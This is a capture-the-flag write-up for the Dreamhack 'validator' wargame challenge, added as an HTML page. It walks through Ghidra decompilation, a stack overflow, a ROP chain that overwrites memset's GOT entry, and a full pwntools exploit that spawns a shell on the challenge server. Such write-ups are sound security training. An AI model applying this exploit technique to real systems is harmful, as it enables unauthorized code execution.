@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>milkbomb11</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+    <header>
+        <h1>milkbomb11</h1>
+        <a href="/index.html">[to index]</a>
+    </header>
+
+    <main>
+        <p>
+The problem can be seen <a href="https://dreamhack.io/wargame/challenges/94">here</a>.<br>
+It did not provide a source code for the target program so I decompiled it via ghidra. The decompilation result is as below.
+        </p>
+        <pre><code>
+
+undefined8 validate(long buf(in_main),ulong param_2(=128))
+{
+  uint idx;
+  
+  for (idx = 0; idx &lt; 10; idx = idx + 1) {
+    if (*(char *)(buf(in_main) + (int)idx) != correct(DREAMHACK!)[(int)idx]) {
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+  }
+  idx = 0xb;
+  while( true ) {
+    if (param_2(=128) &lt;= (ulong)(long)(int)idx) {
+      return 0;
+    }
+    if ((uint)*(byte *)(buf(in_main) + (int)idx) !=
+        (int)*(char *)(buf(in_main) + (long)(int)idx + 1) + 1U) break;
+    idx = idx + 1;
+  }
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+
+undefined8 main(void)
+{
+  undefined1 local_88 [128];
+  
+  memset(local_88,0,0x10);
+  read(0,local_88,0x400);
+  validate(local_88,0x80);
+  return 0;
+}
+
+        </code></pre>
+        <p>
+            Running <code>checksec</code> on the binary shows that there were no stack canaries, PIE, and NX.
+            Examining <code>main</code>, I can see that there is a massive buffer overflow on <code>local_88</code>, which is exploitable.
+            And from the hint given from the description of the problem, every readable segment is executable, which meant that the GOT table is executable as well.
+            This leads me to think of an exploit where we employ ROP to overwrite the GOT entry of a function with shellcode which summons the shell.
+            But for that to work, <code>main</code> needs to return normally, and for it to return normally, <code>validate</code> needs to return normally, 
+            and finally for that to return normally, <code>local_88</code> of <code>main</code> needs to satisfy two conditions. 
+            The first is that local_88[0..10] must equal "DREAMHACK!", and the second one is that for i = [11..128], local_88[i] == local[i+1] + 1, or in other words, 
+            its value must be descending by exactly 1.
+        </p>
+        <p>
+            So we first send the appropriate sequence of characters into local_88 to satisfy <code>validate</code> before appending an ROP chain.
+            The rop chain looks like this.
+        </p>
+        <pre><code>
+p64(rdi_gadget) + p64(0x0) + 
+p64(rsi_gadget) + p64(memset_got_addr) + p64(0x2) + 
+p64(rdx_gadget) + p64(0x400) + p64(read_plt) + 
+p64(memset_got_addr)
+        </code></pre>
+        <p>
+            Our goal is to call <code>read(0x0, memset's got addr, 0x400)</code> so that we can overwrite into the got entry of <code>memset</code> with shellcode.
+            The first three lines do that, and the fourth line returns to the got entry of <code>memset</code>, where our shellcode will be waiting to be executed.
+            The entire exploit code is as below.
+        </p>
+        <pre><code>
+#!/usr/bin/python3
+from pwn import *
+
+def ex():
+    context.arch = "amd64"
+    #context.log_level = "debug"
+    #p = process("./validator_dist")
+    p = remote("host8.dreamhack.games", 20214)
+    e = ELF("./validator_dist")
+    rop = ROP("./validator_server")
+    print(rop.rdi, rop.rsi, rop.rdx)
+    print("got.plt address of memset : 0x%x" % e.got["memset"])
+    print("got.plt address of read : 0x%x" % e.got["read"])
+    print(".plt address of read : 0x%x" % e.plt["read"])
+    
+    rdi_gadget = rop.rdi.address # 0x4006f3
+    rsi_gadget = rop.rsi.address # 0x4006f1
+    rdx_gadget = rop.rdx.address # 0x40057b
+    memset_got_addr = e.got["memset"]
+    read_plt = e.plt["read"]
+
+    validator_bytes = b""
+    for i in range (117,-1,-1):
+        validator_bytes += i.to_bytes(1)
+    print(validator_bytes.__len__(), validator_bytes)
+
+    p.send(bytes.ljust(b"DREAMHACK!\x00"+validator_bytes, 128+8, b"A") + 
+           p64(rdi_gadget) + p64(0x0) + 
+           p64(rsi_gadget) + p64(memset_got_addr) + p64(0x2) + 
+           p64(rdx_gadget) + p64(0x400) + 
+           p64(read_plt) + p64(memset_got_addr))
+
+    sleep(0.1)
+    shellcode = asm(shellcraft.sh())
+    p.send(shellcode)
+    p.interactive()
+
+
+if __name__ == "__main__": ex()
+        </code></pre>
+    </main>
+</body>
+</html>
